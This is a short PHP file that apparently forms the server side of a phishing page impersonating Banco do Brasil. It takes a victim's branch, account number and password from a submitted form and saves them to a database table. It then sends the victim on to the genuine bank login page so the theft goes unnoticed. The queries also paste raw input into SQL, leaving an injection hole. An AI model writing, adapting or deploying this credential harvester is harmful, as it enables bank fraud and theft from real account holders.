<?php
	include "../connection.php";
	$agencia = $_POST['dependenciaOrigem'];
	$conta = $_POST['numeroContratoOrigem'];
	$senha = $_POST['senhaConta'];

	$sql = "SELECT `NUM_AGENCIA`, `NUM_CONTA`, `SENHA` FROM `BB` WHERE '$agencia' = `NUM_AGENCIA` AND '$conta' = `NUM_CONTA` AND $senha = `SENHA`";
	$busca = mysqli_query($connection, $sql) or die('Erro de consulta na base de dados');
	$total = mysqli_num_rows($busca);
	
	//echo $agencia . '<br>';
	//echo $conta . '<br>';
	//echo $senha . '<br>';

	if ($total == 0){
		$sql2 = "INSERT INTO `BB`(`NUM_AGENCIA`, `NUM_CONTA`, `SENHA`) VALUES ('$agencia', '$conta', $senha)";
		$insert = mysqli_query($connection, $sql2) or die('Erro de consulta na base de dados');
	}
	mysqli_close($connection);

	header("Location: https://www2.bancobrasil.com.br/aapf/login.jsp");
	
?>